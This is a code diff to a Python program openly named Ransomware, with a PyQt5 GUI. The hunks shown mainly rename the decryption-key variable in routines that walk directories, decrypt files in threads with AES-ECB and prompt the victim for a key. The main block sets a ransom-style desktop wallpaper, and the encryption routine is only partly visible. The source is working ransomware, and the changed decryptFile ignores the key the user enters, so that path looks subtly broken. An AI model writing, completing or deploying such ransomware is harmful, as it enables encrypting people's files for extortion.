@@ -170,9 +170,9 @@ class Ransomware(PyQt5.QtCore.QRunnable):  # defines class that inherits from py
         except Exception as e:
             print(f"Error encrypting {file}: {e}")
 
-    def decryptFile(self, file, decryption_key):
+    def decryptFile(self, file):
         try:
-            key = decryption_key.encode()  # Convert decryption key to bytes
+            key = self.decryptionPass.encode()  # Convert decryption key to bytes
             cipher = Cipher(algorithms.AES(key), modes.ECB(), backend=default_backend()).decryptor()
 
             # Read ciphertext
@@ -429,12 +429,12 @@ class RansomwareGUI(QMainWindow):
         text, ok = QInputDialog.getText(self, "Enter Decryption Key", "Enter your decryption key:")
 
         if ok:
-            decryption_key = text
-            self.decryptFiles(decryption_key)  # Pass the obtained decryption key to decryptFiles method
+            decryptionPass = text
+            self.decryptFiles(decryptionPass)  # Pass the obtained decryption key to decryptFiles method
 
-    def decryptFiles(self, decryption_key):
-        if decryption_key:
-            print(f"Decryption key for all files: {decryption_key}")  # Debug statement to print decryption key
+    def decryptFiles(self, decryptionPass):
+        if decryptionPass:
+            print(f"Decryption key for all files: {decryptionPass}")  # Debug statement to print decryption key
             ransomware_instance = Ransomware()
         for root, directories, files in os.walk(ransomware_instance.filePath):
             for filename in files:
@@ -443,7 +443,7 @@ class RansomwareGUI(QMainWindow):
                     if base in filepath:
                         print(f"Decrypting file: {filepath}")  # Debug statement to print file being decrypted
                         threading.Thread(target=ransomware_instance.decryptFile,
-                                         args=(filepath, decryption_key)).start()
+                                         args=(filepath, decryptionPass)).start()
             for directory in directories:  # Iterating over subdirectories
                 try:
                     for filename in os.listdir(os.path.join(root, directory)):
@@ -452,7 +452,7 @@ class RansomwareGUI(QMainWindow):
                             if base in filepath:
                                 print(f"Decrypting file: {filepath}")  # Debug statement to print file being decrypted
                                 threading.Thread(target=ransomware_instance.decryptFile,
-                                                 args=(filepath, decryption_key)).start()
+                                                 args=(filepath, decryptionPass)).start()
                 except PermissionError as e:
                     print(f"PermissionError: {e}. Skipping directory: {directory}")
 
@@ -628,7 +628,7 @@ if __name__ == '__main__':
 
     # Call the function to set the wallpaper
     set_wallpaper(image_filename)
-    decryption_key = Ransomware().decryptionPass
+    decryptionPass = Ransomware().decryptionPass
     app = QApplication(sys.argv)
-    gui = RansomwareGUI(decryption_key)
+    gui = RansomwareGUI(decryptionPass)
     sys.exit(app.exec_())
